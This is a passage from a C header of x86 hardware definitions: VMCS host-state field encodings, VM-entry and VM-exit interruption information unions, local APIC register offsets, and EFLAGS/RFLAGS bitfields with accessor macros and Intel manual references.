#define VMCS_HOST_TR_BASE                                            0x00006C0A

                                                                                                                                                                                             /**
                                                                                                                                                                                              * Host GDTR base.
                                                                                                                                                                                              */
#define VMCS_HOST_GDTR_BASE                                          0x00006C0C

                                                                                                                                                                                              /**
                                                                                                                                                                                               * Host IDTR base.
                                                                                                                                                                                               */
#define VMCS_HOST_IDTR_BASE                                          0x00006C0E

                                                                                                                                                                                               /**
                                                                                                                                                                                                * Host IA32_SYSENTER_ESP.
                                                                                                                                                                                                */
#define VMCS_HOST_SYSENTER_ESP                                       0x00006C10

                                                                                                                                                                                                /**
                                                                                                                                                                                                 * Host IA32_SYSENTER_EIP.
                                                                                                                                                                                                 */
#define VMCS_HOST_SYSENTER_EIP                                       0x00006C12

                                                                                                                                                                                                 /**
                                                                                                                                                                                                  * Host RSP.
                                                                                                                                                                                                  */
#define VMCS_HOST_RSP                                                0x00006C14

                                                                                                                                                                                                  /**
                                                                                                                                                                                                   * Host RIP.
                                                                                                                                                                                                   */
#define VMCS_HOST_RIP                                                0x00006C16

                                                                                                                                                                                                   /**
                                                                                                                                                                                                    * Host IA32_S_CET.
                                                                                                                                                                                                    */
#define VMCS_HOST_S_CET                                              0x00006C18

                                                                                                                                                                                                    /**
                                                                                                                                                                                                     * Host SSP.
                                                                                                                                                                                                     */
#define VMCS_HOST_SSP                                                0x00006C1A

                                                                                                                                                                                                     /**
                                                                                                                                                                                                      * Host IA32_INTERRUPT_SSP_TABLE_ADDR.
                                                                                                                                                                                                      */
#define VMCS_HOST_INTERRUPT_SSP_TABLE_ADDR                           0x00006C1C
                                                                                                                                                                                                      /**
                                                                                                                                                                                                       * @}
                                                                                                                                                                                                       */

                                                                                                                                                                                                       /**
                                                                                                                                                                                                        * @}
                                                                                                                                                                                                        */

                                                                                                                                                                                                        /**
                                                                                                                                                                                                         * @}
                                                                                                                                                                                                         */

                                                                                                                                                                                                         /**
                                                                                                                                                                                                          * @brief Valid interruption types
                                                                                                                                                                                                          */
typedef enum
{
    /**
     * External interrupt.
     */
    ExternalInterrupt = 0x00000000,

    /**
     * Non-maskable interrupt (NMI).
     */
    NonMaskableInterrupt = 0x00000002,

    /**
     * Hardware exception (e.g,. \#PF).
     */
    HardwareException = 0x00000003,

    /**
     * Software interrupt (INT n).
     */
    SoftwareInterrupt = 0x00000004,

    /**
     * Privileged software exception (INT1).
     */
    PrivilegedSoftwareException = 0x00000005,

    /**
     * Software exception (INT3 or INTO).
     */
    SoftwareException = 0x00000006,

    /**
     * Other event. This type is used for injection of events that are not delivered through the IDT.
     */
    OtherEvent = 0x00000007,
} INTERRUPTION_TYPE;

/**
 * @brief VM entry can be configured to conclude by delivering an event through the IDT (after all guest state and MSRs
 *        have been loaded). This process is called event injection and is controlled by these VM-entry control fields
 *
 * @see Vol3A[24.8.3(VM-Entry Controls for Event Injection)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * @brief Vector of interrupt or exception
         *
         * [Bits 7:0] Determines which entry in the IDT is used or which other event is injected.
         */
        UINT32 Vector : 8;
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_BIT                     0
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_FLAG                    0xFF
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_MASK                    0xFF
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR(_)                      (((_) >> 0) & 0xFF)

        /**
         * @brief Interruption type
         *
         * [Bits 10:8] Determines details of how the injection is performed.
         */
        UINT32 InterruptionType : 3;
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_BIT          8
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_FLAG         0x700
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_MASK         0x07
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE(_)           (((_) >> 8) & 0x07)

        /**
         * @brief Deliver error code (0 = do not deliver; 1 = deliver)
         *
         * [Bit 11] Determines whether delivery pushes an error code on the guest stack.
         */
        UINT32 DeliverErrorCode : 1;
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_BIT         11
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_FLAG        0x800
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_MASK        0x01
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE(_)          (((_) >> 11) & 0x01)
        UINT32 Reserved1 : 19;

        /**
         * @brief Valid
         *
         * [Bit 31] VM entry injects an event if and only if the valid bit is 1. The valid bit in this field is cleared on every VM
         * exit.
         */
        UINT32 Valid : 1;
#define VMENTRY_INTERRUPT_INFORMATION_VALID_BIT                      31
#define VMENTRY_INTERRUPT_INFORMATION_VALID_FLAG                     0x80000000
#define VMENTRY_INTERRUPT_INFORMATION_VALID_MASK                     0x01
#define VMENTRY_INTERRUPT_INFORMATION_VALID(_)                       (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
} VMENTRY_INTERRUPT_INFORMATION;

/**
 * @brief VM entry can be configured to conclude by delivering an event through the IDT (after all guest state and MSRs
 *        have been loaded). This process is called event injection and is controlled by these VM-entry control fields
 *
 * @see Vol3A[24.9.2(Information for VM Exits Due to Vectored Events)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Vector of interrupt or exception.
         */
        UINT32 Vector : 8;
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_BIT                      0
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_FLAG                     0xFF
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_MASK                     0xFF
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR(_)                       (((_) >> 0) & 0xFF)

        /**
         * [Bits 10:8] Interruption type.
         */
        UINT32 InterruptionType : 3;
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_BIT           8
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_FLAG          0x700
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_MASK          0x07
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE(_)            (((_) >> 8) & 0x07)

        /**
         * [Bit 11] Deliver error code (0 = do not deliver; 1 = deliver).
         */
        UINT32 ErrorCodeValid : 1;
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_BIT            11
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_FLAG           0x800
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_MASK           0x01
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID(_)             (((_) >> 11) & 0x01)

        /**
         * [Bit 12] NMI unblocking due to IRET.
         */
        UINT32 NmiUnblocking : 1;
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_BIT              12
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_FLAG             0x1000
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_MASK             0x01
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING(_)               (((_) >> 12) & 0x01)
        UINT32 Reserved1 : 18;

        /**
         * [Bit 31] Valid.
         */
        UINT32 Valid : 1;
#define VMEXIT_INTERRUPT_INFORMATION_VALID_BIT                       31
#define VMEXIT_INTERRUPT_INFORMATION_VALID_FLAG                      0x80000000
#define VMEXIT_INTERRUPT_INFORMATION_VALID_MASK                      0x01
#define VMEXIT_INTERRUPT_INFORMATION_VALID(_)                        (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
} VMEXIT_INTERRUPT_INFORMATION;

/**
 * @}
 */

 /**
  * @defgroup APIC \
  *           Advanced Programmable Interrupt Controller (APIC)
  *
  * Software interacts with the local APIC by reading and writing its registers. APIC registers are memory-mapped to a
  * 4-KByte region of the processor's physical address space with an initial starting address of FEE00000H. For correct APIC
  * operation, this address space must be mapped to an area of memory that has been designated as strong uncacheable (UC).
  *
  * @remarks Registers are 32 bits, 64 bits, or 256 bits in width; all are aligned on 128-bit boundaries. All 32-bit
  *          registers should be accessed using 128-bit aligned 32-bit loads or stores. Some processors may support loads and stores
  *          of less than 32 bits to some of the APIC registers. This is model specific behavior and is not guaranteed to work on all
  *          processors. Any FP/MMX/SSE access to an APIC register, or any access that touches bytes 4 through 15 of an APIC register
  *          may cause undefined behavior and must not be executed. This undefined behavior could include hangs, incorrect results or
  *          unexpected exceptions, including machine checks, and may vary between implementations. Wider registers (64-bit or
  *          256-bit) must be accessed using multiple 32-bit loads or stores, with all accesses being 128-bit aligned.
  * @see Vol3A[10.4.1(The Local APIC Block Diagram)] (reference)
  * @{
  */
  /**
   * Local APIC Base Address.
   *
   * @remarks Reserved.
   */
#define APIC_BASE_ADDRESS                                            0xFEE00000

   /**
    * Local APIC ID Register.
    */
#define APIC_ID                                                      0x00000020

    /**
     * Local APIC Version Register.
     */
#define APIC_VERSION                                                 0x00000030

     /**
      * Task Priority Register (TPR).
      */
#define APIC_TASK_PRIORITY                                           0x00000080

      /**
       * Arbitration Priority Register (APR).
       */
#define APIC_ARBITRATION_PRIORITY                                    0x00000090

       /**
        * Processor Priority Register (PPR).
        */
#define APIC_PROCESSOR_PRIORITY                                      0x000000A0

        /**
         * EOI Register.
         */
#define APIC_EOI                                                     0x000000B0

         /**
          * Remote Read Register (RRD).
          */
#define APIC_REMOTE_READ                                             0x000000C0

          /**
           * Logical Destination Register.
           */
#define APIC_LOGICAL_DESTINATION                                     0x000000D0

           /**
            * Destination Format Register.
            *
            * @see Vol3A[10.6.2.2(Logical Destination Mode)]
            */
#define APIC_DESTINATION_FORMAT                                      0x000000E0

            /**
             * Spurious Interrupt Vector Register.
             *
             * @see Vol3A[10.9(SPURIOUS INTERRUPT)]
             */
#define APIC_SPURIOUS_INTERRUPT_VECTOR                               0x000000F0

             /**
              * In-Service Register (ISR); bits 31:0.
              */
#define APIC_IN_SERVICE_BITS_31_0                                    0x00000100

              /**
               * In-Service Register (ISR); bits 63:32.
               */
#define APIC_IN_SERVICE_BITS_63_32                                   0x00000110

               /**
                * In-Service Register (ISR); bits 95:64.
                */
#define APIC_IN_SERVICE_BITS_95_64                                   0x00000120

                /**
                 * In-Service Register (ISR); bits 127:96.
                 */
#define APIC_IN_SERVICE_BITS_127_96                                  0x00000130

                 /**
                  * In-Service Register (ISR); bits 159:128.
                  */
#define APIC_IN_SERVICE_BITS_159_128                                 0x00000140

                  /**
                   * In-Service Register (ISR); bits 191:160.
                   */
#define APIC_IN_SERVICE_BITS_191_160                                 0x00000150

                   /**
                    * In-Service Register (ISR); bits 223:192.
                    */
#define APIC_IN_SERVICE_BITS_223_192                                 0x00000160

                    /**
                     * In-Service Register (ISR); bits 255:224.
                     */
#define APIC_IN_SERVICE_BITS_255_224                                 0x00000170

                     /**
                      * Trigger Mode Register (TMR); bits 31:0.
                      */
#define APIC_TRIGGER_MODE_BITS_31_0                                  0x00000180

                      /**
                       * Trigger Mode Register (TMR); bits 63:32.
                       */
#define APIC_TRIGGER_MODE_BITS_63_32                                 0x00000190

                       /**
                        * Trigger Mode Register (TMR); bits 95:64.
                        */
#define APIC_TRIGGER_MODE_BITS_95_64                                 0x000001A0

                        /**
                         * Trigger Mode Register (TMR); bits 127:96.
                         */
#define APIC_TRIGGER_MODE_BITS_127_96                                0x000001B0

                         /**
                          * Trigger Mode Register (TMR); bits 159:128.
                          */
#define APIC_TRIGGER_MODE_BITS_159_128                               0x000001C0

                          /**
                           * Trigger Mode Register (TMR); bits 191:160.
                           */
#define APIC_TRIGGER_MODE_BITS_191_160                               0x000001D0

                           /**
                            * Trigger Mode Register (TMR); bits 223:192.
                            */
#define APIC_TRIGGER_MODE_BITS_223_192                               0x000001E0

                            /**
                             * Trigger Mode Register (TMR); bits 255:224.
                             */
#define APIC_TRIGGER_MODE_BITS_255_224                               0x000001F0

                             /**
                              * Interrupt Request Register (IRR); bits 31:0.
                              */
#define APIC_INTERRUPT_REQUEST_BITS_31_0                             0x00000200

                              /**
                               * Interrupt Request Register (IRR); bits 63:32.
                               */
#define APIC_INTERRUPT_REQUEST_BITS_63_32                            0x00000210

                               /**
                                * Interrupt Request Register (IRR); bits 95:64.
                                */
#define APIC_INTERRUPT_REQUEST_BITS_95_64                            0x00000220

                                /**
                                 * Interrupt Request Register (IRR); bits 127:96.
                                 */
#define APIC_INTERRUPT_REQUEST_BITS_127_96                           0x00000230

                                 /**
                                  * Interrupt Request Register (IRR); bits 159:128.
                                  */
#define APIC_INTERRUPT_REQUEST_BITS_159_128                          0x00000240

                                  /**
                                   * Interrupt Request Register (IRR); bits 191:160.
                                   */
#define APIC_INTERRUPT_REQUEST_BITS_191_160                          0x00000250

                                   /**
                                    * Interrupt Request Register (IRR); bits 223:192.
                                    */
#define APIC_INTERRUPT_REQUEST_BITS_223_192                          0x00000260

                                    /**
                                     * Interrupt Request Register (IRR); bits 255:224.
                                     */
#define APIC_INTERRUPT_REQUEST_BITS_255_224                          0x00000270

                                     /**
                                      * Error Status Register.
                                      */
#define APIC_ERROR_STATUS                                            0x00000280

                                      /**
                                       * LVT Corrected Machine Check Interrupt (CMCI) Register.
                                       */
#define APIC_LVT_CORRECTED_MACHINE_CHECK_INTERRUPT                   0x000002F0

                                       /**
                                        * Interrupt Command Register (ICR); bits 0-31.
                                        */
#define APIC_INTERRUPT_COMMAND_BITS_0_31                             0x00000300

                                        /**
                                         * Interrupt Command Register (ICR); bits 32-63.
                                         */
#define APIC_INTERRUPT_COMMAND_BITS_32_63                            0x00000310

                                         /**
                                          * LVT Timer Register.
                                          */
#define APIC_LVT_TIMER                                               0x00000320

                                          /**
                                           * LVT Thermal Sensor Register.
                                           */
#define APIC_LVT_THERMAL_SENSOR                                      0x00000330

                                           /**
                                            * LVT Performance Monitoring Counters Register.
                                            */
#define APIC_LVT_PERFORMANCE_MONITORING_COUNTERS                     0x00000340

                                            /**
                                             * LVT LINT0 Register.
                                             */
#define APIC_LVT_LINT0                                               0x00000350

                                             /**
                                              * LVT LINT1 Register.
                                              */
#define APIC_LVT_LINT1                                               0x00000360

                                              /**
                                               * LVT Error Register.
                                               */
#define APIC_LVT_ERROR                                               0x00000370

                                               /**
                                                * Initial Count Register (for Timer).
                                                */
#define APIC_INITIAL_COUNT                                           0x00000380

                                                /**
                                                 * Current Count Register (for Timer).
                                                 */
#define APIC_CURRENT_COUNT                                           0x00000390

                                                 /**
                                                  * Divide Configuration Register (for Timer).
                                                  */
#define APIC_DIVIDE_CONFIGURATION                                    0x000003E0
                                                  /**
                                                   * @}
                                                   */

                                                   /**
                                                    * The 32-bit EFLAGS register contains a group of status flags, a control flag, and a group of system flags. The status
                                                    * flags (bits 0, 2, 4, 6, 7, and 11) of the EFLAGS register indicate the results of arithmetic instructions, such as the
                                                    * ADD, SUB, MUL, and DIV instructions.
                                                    * The system flags and IOPL field in the EFLAGS register control operating-system or executive operations.
                                                    *
                                                    * @see Vol1[3.4.3(EFLAGS)] (reference)
                                                    */
typedef union
{
    struct
    {
        /**
         * @brief Carry flag
         *
         * [Bit 0] Set if an arithmetic operation generates a carry or a borrow out of the mostsignificant bit of the result;
         * cleared otherwise. This flag indicates an overflow condition for unsigned-integer arithmetic. It is also used in
         * multiple-precision arithmetic.
         */
        UINT32 CarryFlag : 1;
#define EFLAGS_CARRY_FLAG_BIT                                        0
#define EFLAGS_CARRY_FLAG_FLAG                                       0x01
#define EFLAGS_CARRY_FLAG_MASK                                       0x01
#define EFLAGS_CARRY_FLAG(_)                                         (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Reserved - always 1
         */
        UINT32 ReadAs1 : 1;
#define EFLAGS_READ_AS_1_BIT                                         1
#define EFLAGS_READ_AS_1_FLAG                                        0x02
#define EFLAGS_READ_AS_1_MASK                                        0x01
#define EFLAGS_READ_AS_1(_)                                          (((_) >> 1) & 0x01)

        /**
         * @brief Parity flag
         *
         * [Bit 2] Set if the least-significant byte of the result contains an even number of 1 bits; cleared otherwise.
         */
        UINT32 ParityFlag : 1;
#define EFLAGS_PARITY_FLAG_BIT                                       2
#define EFLAGS_PARITY_FLAG_FLAG                                      0x04
#define EFLAGS_PARITY_FLAG_MASK                                      0x01
#define EFLAGS_PARITY_FLAG(_)                                        (((_) >> 2) & 0x01)
        UINT32 Reserved1 : 1;

        /**
         * @brief Auxiliary Carry flag
         *
         * [Bit 4] Set if an arithmetic operation generates a carry or a borrow out of bit 3 of the result; cleared otherwise. This
         * flag is used in binary-coded decimal (BCD) arithmetic.
         */
        UINT32 AuxiliaryCarryFlag : 1;
#define EFLAGS_AUXILIARY_CARRY_FLAG_BIT                              4
#define EFLAGS_AUXILIARY_CARRY_FLAG_FLAG                             0x10
#define EFLAGS_AUXILIARY_CARRY_FLAG_MASK                             0x01
#define EFLAGS_AUXILIARY_CARRY_FLAG(_)                               (((_) >> 4) & 0x01)
        UINT32 Reserved2 : 1;

        /**
         * @brief Zero flag
         *
         * [Bit 6] Set if the result is zero; cleared otherwise.
         */
        UINT32 ZeroFlag : 1;
#define EFLAGS_ZERO_FLAG_BIT                                         6
#define EFLAGS_ZERO_FLAG_FLAG                                        0x40
#define EFLAGS_ZERO_FLAG_MASK                                        0x01
#define EFLAGS_ZERO_FLAG(_)                                          (((_) >> 6) & 0x01)

        /**
         * @brief Sign flag
         *
         * [Bit 7] Set equal to the most-significant bit of the result, which is the sign bit of a signed integer. (0 indicates a
         * positive value and 1 indicates a negative value.)
         */
        UINT32 SignFlag : 1;
#define EFLAGS_SIGN_FLAG_BIT                                         7
#define EFLAGS_SIGN_FLAG_FLAG                                        0x80
#define EFLAGS_SIGN_FLAG_MASK                                        0x01
#define EFLAGS_SIGN_FLAG(_)                                          (((_) >> 7) & 0x01)

        /**
         * @brief Trap flag
         *
         * [Bit 8] Set to enable single-step mode for debugging; clear to disable single-step mode.
         */
        UINT32 TrapFlag : 1;
#define EFLAGS_TRAP_FLAG_BIT                                         8
#define EFLAGS_TRAP_FLAG_FLAG                                        0x100
#define EFLAGS_TRAP_FLAG_MASK                                        0x01
#define EFLAGS_TRAP_FLAG(_)                                          (((_) >> 8) & 0x01)

        /**
         * @brief Interrupt enable flag
         *
         * [Bit 9] Controls the response of the processor to maskable interrupt requests. Set to respond to maskable interrupts;
         * cleared to inhibit maskable interrupts.
         */
        UINT32 InterruptEnableFlag : 1;
#define EFLAGS_INTERRUPT_ENABLE_FLAG_BIT                             9
#define EFLAGS_INTERRUPT_ENABLE_FLAG_FLAG                            0x200
#define EFLAGS_INTERRUPT_ENABLE_FLAG_MASK                            0x01
#define EFLAGS_INTERRUPT_ENABLE_FLAG(_)                              (((_) >> 9) & 0x01)

        /**
         * @brief Direction flag
         *
         * [Bit 10] Controls string instructions (MOVS, CMPS, SCAS, LODS, and STOS). Setting the DF flag causes the string
         * instructions to auto-decrement (to process strings from high addresses to low addresses). Clearing the DF flag causes
         * the string instructions to auto-increment (process strings from low addresses to high addresses).
         */
        UINT32 DirectionFlag : 1;
#define EFLAGS_DIRECTION_FLAG_BIT                                    10
#define EFLAGS_DIRECTION_FLAG_FLAG                                   0x400
#define EFLAGS_DIRECTION_FLAG_MASK                                   0x01
#define EFLAGS_DIRECTION_FLAG(_)                                     (((_) >> 10) & 0x01)

        /**
         * @brief Overflow flag
         *
         * [Bit 11] Set if the integer result is too large a positive number or too small a negative number (excluding the
         * sign-bit) to fit in the destination operand; cleared otherwise. This flag indicates an overflow condition for
         * signed-integer (two's complement) arithmetic.
         */
        UINT32 OverflowFlag : 1;
#define EFLAGS_OVERFLOW_FLAG_BIT                                     11
#define EFLAGS_OVERFLOW_FLAG_FLAG                                    0x800
#define EFLAGS_OVERFLOW_FLAG_MASK                                    0x01
#define EFLAGS_OVERFLOW_FLAG(_)                                      (((_) >> 11) & 0x01)

        /**
         * @brief I/O privilege level field
         *
         * [Bits 13:12] Indicates the I/O privilege level of the currently running program or task. The current privilege level
         * (CPL) of the currently running program or task must be less than or equal to the I/O privilege level to access the I/O
         * address space. The POPF and IRET instructions can modify this field only when operating at a CPL of 0.
         */
        UINT32 IoPrivilegeLevel : 2;
#define EFLAGS_IO_PRIVILEGE_LEVEL_BIT                                12
#define EFLAGS_IO_PRIVILEGE_LEVEL_FLAG                               0x3000
#define EFLAGS_IO_PRIVILEGE_LEVEL_MASK                               0x03
#define EFLAGS_IO_PRIVILEGE_LEVEL(_)                                 (((_) >> 12) & 0x03)

        /**
         * @brief Nested task flag
         *
         * [Bit 14] Controls the chaining of interrupted and called tasks. Set when the current task is linked to the previously
         * executed task; cleared when the current task is not linked to another task.
         */
        UINT32 NestedTaskFlag : 1;
#define EFLAGS_NESTED_TASK_FLAG_BIT                                  14
#define EFLAGS_NESTED_TASK_FLAG_FLAG                                 0x4000
#define EFLAGS_NESTED_TASK_FLAG_MASK                                 0x01
#define EFLAGS_NESTED_TASK_FLAG(_)                                   (((_) >> 14) & 0x01)
        UINT32 Reserved3 : 1;

        /**
         * @brief Resume flag
         *
         * [Bit 16] Controls the processor's response to debug exceptions.
         */
        UINT32 ResumeFlag : 1;
#define EFLAGS_RESUME_FLAG_BIT                                       16
#define EFLAGS_RESUME_FLAG_FLAG                                      0x10000
#define EFLAGS_RESUME_FLAG_MASK                                      0x01
#define EFLAGS_RESUME_FLAG(_)                                        (((_) >> 16) & 0x01)

        /**
         * @brief Virtual-8086 mode flag
         *
         * [Bit 17] Set to enable virtual-8086 mode; clear to return to protected mode without virtual-8086 mode semantics.
         */
        UINT32 Virtual8086ModeFlag : 1;
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_BIT                            17
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_FLAG                           0x20000
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_MASK                           0x01
#define EFLAGS_VIRTUAL_8086_MODE_FLAG(_)                             (((_) >> 17) & 0x01)

        /**
         * @brief Alignment check (or access control) flag
         *
         * [Bit 18] If the AM bit is set in the CR0 register, alignment checking of user-mode data accesses is enabled if and only
         * if this flag is 1. If the SMAP bit is set in the CR4 register, explicit supervisor-mode data accesses to user-mode pages
         * are allowed if and only if this bit is 1.
         *
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT32 AlignmentCheckFlag : 1;
#define EFLAGS_ALIGNMENT_CHECK_FLAG_BIT                              18
#define EFLAGS_ALIGNMENT_CHECK_FLAG_FLAG                             0x40000
#define EFLAGS_ALIGNMENT_CHECK_FLAG_MASK                             0x01
#define EFLAGS_ALIGNMENT_CHECK_FLAG(_)                               (((_) >> 18) & 0x01)

        /**
         * @brief Virtual interrupt flag
         *
         * [Bit 19] Virtual image of the IF flag. Used in conjunction with the VIP flag. (To use this flag and the VIP flag the
         * virtual mode extensions are enabled by setting the VME flag in control register CR4.)
         */
        UINT32 VirtualInterruptFlag : 1;
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_BIT                            19
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_FLAG                           0x80000
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_MASK                           0x01
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG(_)                             (((_) >> 19) & 0x01)

        /**
         * @brief Virtual interrupt pending flag
         *
         * [Bit 20] Set to indicate that an interrupt is pending; clear when no interrupt is pending. (Software sets and clears
         * this flag; the processor only reads it.) Used in conjunction with the VIF flag.
         */
        UINT32 VirtualInterruptPendingFlag : 1;
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_BIT                    20
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_FLAG                   0x100000
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_MASK                   0x01
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG(_)                     (((_) >> 20) & 0x01)

        /**
         * @brief Identification flag
         *
         * [Bit 21] The ability of a program to set or clear this flag indicates support for the CPUID instruction.
         */
        UINT32 IdentificationFlag : 1;
#define EFLAGS_IDENTIFICATION_FLAG_BIT                               21
#define EFLAGS_IDENTIFICATION_FLAG_FLAG                              0x200000
#define EFLAGS_IDENTIFICATION_FLAG_MASK                              0x01
#define EFLAGS_IDENTIFICATION_FLAG(_)                                (((_) >> 21) & 0x01)
        UINT32 Reserved4 : 10;
    };

    UINT32 Flags;
} EFLAGS;

/**
 * The 64-bit RFLAGS register contains a group of status flags, a control flag, and a group of system flags in 64-bit mode.
 * The upper 32 bits of RFLAGS register is reserved. The lower 32 bits of RFLAGS is the same as EFLAGS.
 *
 * @see EFLAGS
 * @see Vol1[3.4.3.4(RFLAGS Register in 64-Bit Mode)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * @brief Carry flag
         *
         * [Bit 0] See the description in EFLAGS.
         */
        UINT64 CarryFlag : 1;
#define RFLAGS_CARRY_FLAG_BIT                                        0
#define RFLAGS_CARRY_FLAG_FLAG                                       0x01
#define RFLAGS_CARRY_FLAG_MASK                                       0x01
#define RFLAGS_CARRY_FLAG(_)                                         (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Reserved - always 1
         */
        UINT64 ReadAs1 : 1;
#define RFLAGS_READ_AS_1_BIT                                         1
#define RFLAGS_READ_AS_1_FLAG                                        0x02
#define RFLAGS_READ_AS_1_MASK                                        0x01
#define RFLAGS_READ_AS_1(_)                                          (((_) >> 1) & 0x01)

        /**
         * @brief Parity flag
         *
         * [Bit 2] See the description in EFLAGS.
         */
        UINT64 ParityFlag : 1;
#define RFLAGS_PARITY_FLAG_BIT                                       2
#define RFLAGS_PARITY_FLAG_FLAG                                      0x04
#define RFLAGS_PARITY_FLAG_MASK                                      0x01
#define RFLAGS_PARITY_FLAG(_)                                        (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief Auxiliary Carry flag
         *
         * [Bit 4] See the description in EFLAGS.
         */
        UINT64 AuxiliaryCarryFlag : 1;
#define RFLAGS_AUXILIARY_CARRY_FLAG_BIT                              4
#define RFLAGS_AUXILIARY_CARRY_FLAG_FLAG                             0x10
#define RFLAGS_AUXILIARY_CARRY_FLAG_MASK                             0x01
#define RFLAGS_AUXILIARY_CARRY_FLAG(_)                               (((_) >> 4) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief Zero flag
         *
         * [Bit 6] See the description in EFLAGS.
         */
        UINT64 ZeroFlag : 1;
#define RFLAGS_ZERO_FLAG_BIT                                         6
#define RFLAGS_ZERO_FLAG_FLAG                                        0x40
#define RFLAGS_ZERO_FLAG_MASK                                        0x01
#define RFLAGS_ZERO_FLAG(_)                                          (((_) >> 6) & 0x01)

        /**
         * @brief Sign flag
         *
         * [Bit 7] See the description in EFLAGS.
         */
        UINT64 SignFlag : 1;
#define RFLAGS_SIGN_FLAG_BIT                                         7
#define RFLAGS_SIGN_FLAG_FLAG                                        0x80
#define RFLAGS_SIGN_FLAG_MASK                                        0x01
#define RFLAGS_SIGN_FLAG(_)                                          (((_) >> 7) & 0x01)

        /**
         * @brief Trap flag
         *
         * [Bit 8] See the description in EFLAGS.
         */
        UINT64 TrapFlag : 1;
#define RFLAGS_TRAP_FLAG_BIT                                         8
#define RFLAGS_TRAP_FLAG_FLAG                                        0x100
#define RFLAGS_TRAP_FLAG_MASK                                        0x01
#define RFLAGS_TRAP_FLAG(_)                                          (((_) >> 8) & 0x01)

        /**
         * @brief Interrupt enable flag
         *
         * [Bit 9] See the description in EFLAGS.
         */
        UINT64 InterruptEnableFlag : 1;
#define RFLAGS_INTERRUPT_ENABLE_FLAG_BIT                             9
#define RFLAGS_INTERRUPT_ENABLE_FLAG_FLAG                            0x200
#define RFLAGS_INTERRUPT_ENABLE_FLAG_MASK                            0x01
#define RFLAGS_INTERRUPT_ENABLE_FLAG(_)                              (((_) >> 9) & 0x01)

        /**
         * @brief Direction flag
         *
         * [Bit 10] See the description in EFLAGS.
         */
        UINT64 DirectionFlag : 1;
#define RFLAGS_DIRECTION_FLAG_BIT                                    10
#define RFLAGS_DIRECTION_FLAG_FLAG                                   0x400
#define RFLAGS_DIRECTION_FLAG_MASK                                   0x01
#define RFLAGS_DIRECTION_FLAG(_)                                     (((_) >> 10) & 0x01)

        /**
         * @brief Overflow flag
         *
         * [Bit 11] See the description in EFLAGS.
         */
        UINT64 OverflowFlag : 1;
#define RFLAGS_OVERFLOW_FLAG_BIT                                     11
#define RFLAGS_OVERFLOW_FLAG_FLAG                                    0x800
#define RFLAGS_OVERFLOW_FLAG_MASK                                    0x01
#define RFLAGS_OVERFLOW_FLAG(_)                                      (((_) >> 11) & 0x01)

        /**
         * @brief I/O privilege level field
         *
         * [Bits 13:12] See the description in EFLAGS.
         */
        UINT64 IoPrivilegeLevel : 2;
#define RFLAGS_IO_PRIVILEGE_LEVEL_BIT                                12
#define RFLAGS_IO_PRIVILEGE_LEVEL_FLAG                               0x3000
#define RFLAGS_IO_PRIVILEGE_LEVEL_MASK                               0x03
#define RFLAGS_IO_PRIVILEGE_LEVEL(_)                                 (((_) >> 12) & 0x03)

        /**
         * @brief Nested task flag
         *
         * [Bit 14] See the description in EFLAGS.
         */
        UINT64 NestedTaskFlag : 1;
#define RFLAGS_NESTED_TASK_FLAG_BIT                                  14
#define RFLAGS_NESTED_TASK_FLAG_FLAG                                 0x4000
#define RFLAGS_NESTED_TASK_FLAG_MASK                                 0x01
#define RFLAGS_NESTED_TASK_FLAG(_)                                   (((_) >> 14) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * @brief Resume flag
         *
         * [Bit 16] See the description in EFLAGS.
         */
        UINT64 ResumeFlag : 1;
#define RFLAGS_RESUME_FLAG_BIT                                       16
#define RFLAGS_RESUME_FLAG_FLAG                                      0x10000
